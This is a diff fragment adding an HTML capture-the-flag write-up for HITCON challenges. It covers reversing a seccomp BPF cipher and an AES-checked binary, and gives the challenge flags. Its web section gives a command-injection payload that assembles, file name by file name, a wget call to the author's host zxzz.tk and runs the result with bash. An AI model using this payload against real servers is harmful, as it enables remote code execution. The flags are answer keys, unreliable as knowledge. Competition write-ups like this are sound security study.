+print pg.found[0].state.posix.dumps(1)</p>
+<pre class="hljs"><code>
+### Seccomp
+<span class="hljs-symbol">The</span> <span class="hljs-keyword">BPF </span><span class="hljs-meta">code</span> looks like
+```python
+<span class="hljs-symbol">for</span> M in arguments:
+    for round in range(<span class="hljs-number">8</span>):
+        # transform
+        M0 = <span class="hljs-keyword">mul(M0, </span>const.<span class="hljs-keyword">pop(0))
+</span>        M1 = <span class="hljs-keyword">add(M1, </span>const.<span class="hljs-keyword">pop(0))
+</span>        M2 = <span class="hljs-keyword">add(M2, </span>const.<span class="hljs-keyword">pop(0))
+</span>        M3 = <span class="hljs-keyword">mul(M3, </span>const.<span class="hljs-keyword">pop(0))
+</span>        # mix
+        M4 = M0 ^ M2
+        M5 = M1 ^ M3
+        M4_2 = <span class="hljs-keyword">mul(M4, </span>const.<span class="hljs-keyword">pop(0))
+</span>        M5_2 = <span class="hljs-keyword">add(M5, </span>M4_2)
+        M5_3 = <span class="hljs-keyword">mul(M5_2, </span>const.<span class="hljs-keyword">pop(0))
+</span>        M4_3 = <span class="hljs-keyword">add(M4_2, </span>M5_3)
+        M0 ^= M5_3
+        M1 ^= M4_3
+        M2 ^= M5_3
+        M3 ^= M4_3
+        # skip last round
+        <span class="hljs-meta">if</span> round &lt; <span class="hljs-number">7</span>:
+            # swap
+            tmp = M1
+            M1 = M2
+            M2 = tmp
+    # transform
+    M0 = <span class="hljs-keyword">mul(M0, </span>const.<span class="hljs-keyword">pop(0))
+</span>    M1 = <span class="hljs-keyword">add(M1, </span>const.<span class="hljs-keyword">pop(0))
+</span>    M2 = <span class="hljs-keyword">add(M2, </span>const.<span class="hljs-keyword">pop(0))
+</span>    M3 = <span class="hljs-keyword">mul(M3, </span>const.<span class="hljs-keyword">pop(0))
+</span>    # check
+    <span class="hljs-meta">assert</span>(M3 ^ <span class="hljs-number">4919</span> == const.<span class="hljs-keyword">pop(0))
+</span>    <span class="hljs-meta">assert</span>(M2 ^ <span class="hljs-number">4919</span> == const.<span class="hljs-keyword">pop(0))
+</span>    <span class="hljs-meta">assert</span>(M1 ^ <span class="hljs-number">4919</span> == const.<span class="hljs-keyword">pop(0))
+</span>    <span class="hljs-meta">assert</span>(M0 ^ <span class="hljs-number">4919</span> == const.<span class="hljs-keyword">pop(0))</span></code></pre><p>where <code>M</code> is the 64bits input split into 4 16bits integer, <code>mul</code> is multiplication under mod <code>0x10001</code>, and <code>add</code> is addition under mod <code>0x10000</code>.
+Undo the transform parts by inverse elements.
+For the mix parts, <code>M4 = M0 ^ M2 = (M0 ^ M5_3) ^ (M2 ^ M5_3) = M0_2 ^ M2_2</code>, then calcute <code>M4_3</code> and <code>M5_3</code> to find original <code>M0~M4</code></p>
+<h3 id="家徒四壁-~everlasting-imaginative-void~"><a class="header-link" href="#家徒四壁-~everlasting-imaginative-void~"></a>家徒四壁 ~Everlasting Imaginative Void~</h3>
+<ol class="list">
+<li>Notice that <code>.eh_frame</code> is corrupt and a destructor jumps to <code>.eh_frame</code>.</li>
+<li>Trace code and find a check at 0x284 to check if the 16th byte of input is <code>!</code>.</li>
+<li>Bypass the check and notice an AES encryption is performed on input and compared with some ciphertext.</li>
+<li>Decrypt ciphertext with same set of round keys.</li>
+</ol>
+<p><code>hitcon{code_in_BuildID!}</code></p>
+<h2 id="web"><a class="header-link" href="#web"></a>web</h2>
+<h3 id="babyfirst-revenge"><a class="header-link" href="#babyfirst-revenge"></a>BabyFirst Revenge</h3>
+<p>Own <code>zxzz.tk</code></p>
+<pre class="hljs"><code>&gt;echo
+&gt;w\\
+<span class="hljs-comment">*&gt;&gt;.a</span>
+<span class="hljs-keyword">rm</span> w*
+&gt;<span class="hljs-keyword">ge</span>\\
+<span class="hljs-comment">*&gt;&gt;.a</span>
+<span class="hljs-keyword">rm</span> <span class="hljs-keyword">g</span>*
+&gt;t
+&gt;zx\\
+<span class="hljs-comment">*&gt;&gt;.a</span>
+<span class="hljs-keyword">rm</span> t*
+<span class="hljs-keyword">rm</span> z*
+&gt;z\\
+<span class="hljs-comment">*&gt;&gt;.a</span>
+<span class="hljs-keyword">rm</span> z*
+&gt;z.\\
+<span class="hljs-comment">*&gt;&gt;.a</span>
+<span class="hljs-keyword">rm</span> z*
+&gt;tk
+<span class="hljs-comment">*&gt;&gt;.a</span>
+<span class="hljs-keyword">rm</span> t*
+&gt;bash
+b* .a</code></pre><p><code>hitcon{idea_from_phith0n,thank_you:)}</code></p>
+        </article>
+      </div>
+    </div>
+  </body>
+</html>
